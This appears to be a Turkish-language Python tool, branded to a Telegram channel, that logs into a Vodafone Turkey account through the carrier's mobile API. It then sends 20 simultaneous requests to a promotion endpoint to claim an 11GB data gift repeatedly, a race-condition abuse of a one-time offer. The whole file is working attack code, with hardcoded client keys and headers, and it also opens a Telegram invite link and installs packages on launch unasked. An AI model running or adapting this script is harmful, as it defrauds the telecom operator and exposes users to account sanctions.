import subprocess

import sys

import time

def install_module(module):

    subprocess.check_call([sys.executable, "-m", "pip", "install", module])

 

def check_module(module):

    try:

        __import__(module)

        #print(f"[✓] {module} modülü mevcut.")

    except ImportError:

        print(f"[!] {module} modülü bulunamadı. Yükleniyor...")

        install_module(module)

 

required_modules = ["requests", "base64", "json", "time", "colorama","pyfiglet"]

 

for module in required_modules:

    check_module(module)

import requests

import os

import random

import colorama

import threading

import pyfiglet

import base64

from datetime import datetime

import json

import webbrowser

 

def show_channel_prompt():

    print_banner("ZİRVE")

       # Youtube kanal linkini aç

 

import webbrowser    

webbrowser.open("https://t.me/+BawTmt852axmZWY0")

    

def prett(text):

    return text.title().center(os.get_terminal_size().columns)

 

 

 

mavi = colorama.Style.BRIGHT + colorama.Fore.BLUE

cyan = colorama.Style.BRIGHT + colorama.Fore.CYAN

yesil = colorama.Style.BRIGHT + colorama.Fore.GREEN

sari = colorama.Style.BRIGHT + colorama.Fore.YELLOW

kirmizi = colorama.Style.BRIGHT + colorama.Fore.RED

magenta = colorama.Style.BRIGHT + colorama.Fore.MAGENTA

p_sari = colorama.Style.BRIGHT + colorama.Fore.LIGHTYELLOW_EX

p_kirmizi = colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX

p_mag = colorama.Style.BRIGHT + colorama.Fore.LIGHTMAGENTA_EX

p_mavi = colorama.Style.BRIGHT + colorama.Fore.LIGHTBLUE_EX

p_cyan = colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX

p_yesil = colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX

reset = colorama.Fore.RESET

temizle = "cls" if os.name == "nt" else "clear"

os.system(temizle)

def logo():

    print(p_cyan+f"""Vodafone Çoklu İnternet Alma @DarkVipRoom""")

    print(p_sari+" Vodafone 11GB Hediye 20'Defa Alma tools")

    print("")

    

logo()

 

telno = input(f"{p_mag}[+] {p_cyan}Numaranızı girin 0' olmadan: {reset}")

parola = input(f"{p_mag}[+]{p_cyan}{telno} {p_mag}İçin VF Şifren'i Gir: "+reset)

 

headers = {

    "User-Agent": "VodafoneMCare/2308211432 CFNetwork/1325.0.1 Darwin/21.1.0",

    "Content-Length": "83",

    "Connection": "keep-alive",

    "Accept-Language": "tr_TR",

    "Accept-Encoding": "gzip, deflate, br",

    "Host": "m.vodafone.com.tr",

    "Cache-Control": "no-cache",

    "Accept": "*/*",

    "Content-Type": "application/x-www-form-urlencoded"

}

 

url = "https://m.vodafone.com.tr/maltgtwaycbu/api/"

 

 

data = {

    "context": "e30=",

    "username": telno,

    "method": "twoFactorAuthentication",

    "password": parola

}

 

response = requests.post(url, headers=headers, data=data)

proid = response.json().get('process_id')

if proid is None:

 print(p_kirmizi+"[x]Şifre veya Numara Yanlış"+reset)

 raise SystemExit()

else:

 print(p_mavi+"[✓]ŞifreDoğrulama Başarılı"+reset)

 

 

 

 

kod = input(p_yesil+"[+]SMS ile Gelen Kodu Gir: "+reset)

 

 

veri = {

    "langId": "tr_TR",

    "clientVersion": "17.2.5",

    "reportAdvId": "0AD98FF8-C8AB-465C-9235-DDE102D738B3",

    "pbmRight": "1",

    "rememberMe": "true",

    "sid": proid,

    "otpCode": kod,

    "platformName": "iPhone"

}

 

 

base64_veri = base64.b64encode(json.dumps(veri).encode('utf-8'))

 

data2 = {

    "context": base64_veri,

    "grant_type": "urn:vodafone:params:oauth:grant-type:two-factor",

    "code": kod,

    "method": "tokenUsing2FA",

    "process_id": proid,

    "scope": "ALL"

}

 

response2 = requests.post(url, headers=headers, data=data2)

sonuc2 = response2.json()

 

 

o_head = {

    "Accept": "application/json",

    "Language": "tr",

    "ApplicationType": "1",

    "ClientKey": "AC491770-B16A-4273-9CE7-CA790F63365E",

    "sid": proid,

    "Content-Type": "application/json",

    "Content-Length": "54",

    "Host": "m.vodafone.com.tr",

    "Connection": "Keep-Alive",

    "Accept-Encoding": "gzip",

    "User-Agent": "okhttp/4.10.0"

}

subheaders = {

    'VF_INT_CALLER_ID': 'MVATR',

    'vf-channel': 'mobile',

    'vf-trace-transaction-id': 'd3f9a288-70e4-4942-a96a-a3aa44987ea4',

    'vf-country-code': 'TR',

    'sid': proid,

    'Host': 'm.vodafone.com.tr',

    'Connection': 'Keep-Alive',

    'Accept-Encoding': 'gzip',

    'User-Agent': 'okhttp/4.10.0'

}

 

print(p_cyan+"[✓]Giriş Yapıldı"+reset)

time.sleep(1)

 

gb_data = {'method':'getNetworkPromo','promoType':'growth','sid':proid}

 

def send_request():

    resx = requests.post(url, headers=subheaders, data=gb_data).json()["result"]

    if resx == "SUCCESS":

     print(f"{p_yesil}[✓] {p_cyan}11GB {p_sari}Alındı{reset}")

    else:

     print(p_kirmizi+"[×] BOŞ"+reset)

threads = []

for _ in range(20):

    thread = threading.Thread(target=send_request)

    threads.append(thread)

    thread.start()

 
